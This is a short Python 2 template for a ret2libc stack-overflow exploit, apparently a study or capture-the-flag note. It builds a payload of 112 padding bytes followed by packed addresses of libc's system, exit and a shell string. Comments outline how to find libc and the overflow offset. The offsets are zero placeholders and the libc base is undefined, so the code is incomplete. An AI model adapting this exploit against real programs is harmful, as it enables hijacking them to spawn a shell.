import struct

#ldd bin | grep libc
libc_base = libc_addr

#TODO: reaseach how to get this addrs
system_offset = 0x0
exit_offset = 0x0
shell_offset = 0x0

system = struct.pack("<I", libc_base + system_offset)

exit = struct.pack("<I", libc_base + exit_offset)

shell=struct.pack("<I", libc_base + shell_offset)

# find exploit point:
  # generate_pattern
  # debug with the patern
  # offset_pattern with the address
buf = 'A' * 112
buf += system
buf += exit
buf += shell

print buf
